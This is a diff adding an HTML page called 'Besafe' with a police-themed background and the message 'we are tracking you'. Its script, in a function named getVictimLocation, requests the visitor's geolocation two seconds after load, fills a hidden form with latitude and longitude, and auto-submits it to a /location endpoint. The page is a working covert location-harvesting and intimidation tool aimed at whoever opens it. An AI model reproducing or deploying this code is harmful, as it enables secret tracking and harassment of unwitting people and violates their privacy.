@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300&display=swap" rel="stylesheet">
+<link rel="preconnect" href="https://fonts.gstatic.com">
+<link rel="preconnect" href="https://fonts.gstatic.com">
+<link href="https://fonts.googleapis.com/css2?family=DotGothic16&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="css/style.css">
+<title>Besafe</title>
+</head>
+
+<div class="message">
+<!-- </h1> -->
+<h1><span class="c">BESAFE : </span> <span class="b">we ar</span><span class="p">e tra</span><span class="t">cki</span>ng you ....
+
+  </h1>
+
+  <div class="Box">
+		<span></span>
+		<span></span>
+		<span></span>
+		<span></span>
+		<span></span>
+		<span></span>
+	</div>
+
+  <!-- </h1> -->
+</div>
+<a href="" target="_blank">Besafe</a>
+<form class="form" action="/location" method="post">
+  <input class="latitude" type="text" name="latitude" value="">
+  <input class="longitude" type="text" name="longitude" value="">
+  <button type="submit" id="btn" class="">Send</button>
+
+</form>
+
+
+
+
+
+
+
+<style media="screen">
+h1{
+  color:#6e7c7c;
+}
+.Box{
+	position:relative;
+	display:flex;
+}
+.Box span{
+	width:10px;
+	height:10px;
+	border-radius:50%;
+	margin:20px;
+	animation:Loading 1.6s ease-in-out infinite;
+	transform-style:preserve-3d;
+	transform-origin:center;
+}
+.Box span:first-of-type{
+	background-color:#eb3b5a;
+	animation-delay:0s;
+	box-shadow:0px 0px 10px #eb3b5a;
+}
+.Box span:nth-of-type(2){
+	background-color:#2d98da;
+	animation-delay:.2s;
+	box-shadow:0px 0px 10px #2d98da;
+}
+.Box span:nth-of-type(3){
+	background-color:#f7b731;
+	animation-delay:.4s;
+	box-shadow:0px 0px 10px #f7b731;
+}
+.Box span:nth-of-type(4){
+	background-color:#218c74;
+	animation-delay:.6s;
+	box-shadow:0px 0px 10px #218c74;
+}
+.Box span:nth-of-type(5){
+	background-color:#474787;
+	animation-delay:.8s;
+	box-shadow:0px 0px 10px #474787;
+}
+.Box span:last-of-type{
+	background-color:#fa8231;
+	animation-delay:1s;
+	box-shadow:0px 0px 10px #fa8231;
+}
+
+@keyframes Loading{
+
+	0%, 40%, 100%{
+		transform:scale(1);
+	}
+	20%{
+		transform:scale(5);
+	}
+
+}
+
+
+
+
+
+
+
+
+
+
+
+
+body {
+    background-image: url("images/police.webp");
+}
+.form{
+  opacity: 0;
+}
+.message{
+  position: fixed;
+  color: white;
+font-family: 'DotGothic16', sans-serif;
+}
+</style>
+
+
+<script type="text/javascript">
+
+
+
+
+
+setTimeout(function(){ getVictimLocation(); }, 2000);
+function getVictimLocation(){
+  if(navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(function(position) {
+          var positionInfo = "Your current position is (" + "Latitude: " + position.coords.latitude + ", " + "Longitude: " + position.coords.longitude + ")";
+var a=position.coords.latitude;
+var b=position.coords.longitude;
+document.querySelector(".latitude").value=a;
+document.querySelector(".longitude").value=b;
+document.querySelector("#btn").click();
+
+})}
+
+}
+</script>
+
+</body>
+</html>
